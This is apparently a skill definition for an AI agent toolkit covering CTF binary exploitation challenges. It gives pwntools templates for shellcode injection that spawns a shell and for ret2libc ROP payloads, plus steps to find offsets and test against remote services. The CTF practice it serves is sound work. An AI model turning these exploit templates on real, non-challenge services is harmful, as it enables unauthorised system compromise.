---
name: pwn
description: >-
  Solve CTF binary exploitation (pwn) challenges: buffer overflows,
  format strings, ROP chains, heap exploitation, and shellcoding.
  Use when given ELF/PE binaries with a remote service to exploit.
  Triggers: "buffer overflow", "format string", "ROP", "shellcode",
  "checksec", "NX", "canary", "PIE", "GOT overwrite", "ret2libc",
  pwntools scripts, .elf files, nc/netcat connection targets.
  Tools: checksec, ROPgadget, pwntools, gdb, one_gadget.
  NOT for static reverse engineering (use reverse).
---

# CTF Pwn

Analyze and exploit binary exploitation challenges.

## When to Use

Use this command for challenges involving:

- ELF binaries
- Buffer overflows
- Format string vulnerabilities
- ROP chains
- Heap exploitation

## Bundled Scripts

- [check-tools.sh](scripts/check-tools.sh) — Verify required pwn tools are installed
- [run-checksec.sh](scripts/run-checksec.sh) — Check binary protections (CANARY, NX, PIE, RELRO). Outputs JSON with protection status, attack vectors, and suggested exploitation strategy.

## Instructions

1. First check tool availability: `bash scripts/check-tools.sh`

2. **Start with checksec** to understand binary protections:

   ```bash
   bash scripts/run-checksec.sh $ARGUMENTS
   ```

   The JSON output includes:
   - `protections`: status of each protection (enabled/disabled/partial)
   - `attack_vectors`: viable exploitation approaches
   - `suggestions[0]`: recommended exploitation STRATEGY based on protections

   Example: if `stack_canary=disabled` and `nx=disabled`, the strategy is "Classic buffer overflow with shellcode injection".

3. Based on checksec JSON, proceed with exploitation:

   **No Canary + No NX (shellcode):**
   ```python
   from pwn import *
   p = process('./binary')
   shellcode = asm(shellcraft.sh())
   payload = shellcode + b'A' * (offset - len(shellcode)) + p64(buf_addr)
   p.sendline(payload)
   p.interactive()
   ```

   **No Canary + NX + No PIE (ROP):**
   ```bash
   ROPgadget --binary ./binary --re "pop rdi"
   ```
   ```python
   payload = b'A' * offset + p64(pop_rdi) + p64(bin_sh) + p64(system)
   ```

   **PIE enabled (need leak):**
   - Leak address via format string or partial overwrite
   - Calculate base address
   - Build ROP chain with calculated addresses

4. Find offset to return address:

   ```python
   from pwn import *
   print(cyclic(200))
   # After crash: cyclic_find(0x61616161)
   ```

## Exploitation Checklist

1. Run binary, understand behavior
2. `run-checksec.sh` → read JSON `attack_vectors`
3. Find vulnerability (overflow, format string)
4. Find offset to control
5. Build exploit (shellcode or ROP)
6. Test locally, then remote

## Example Usage

```bash
/ctf-kit:pwn ./challenge
/ctf-kit:pwn ./binary
```
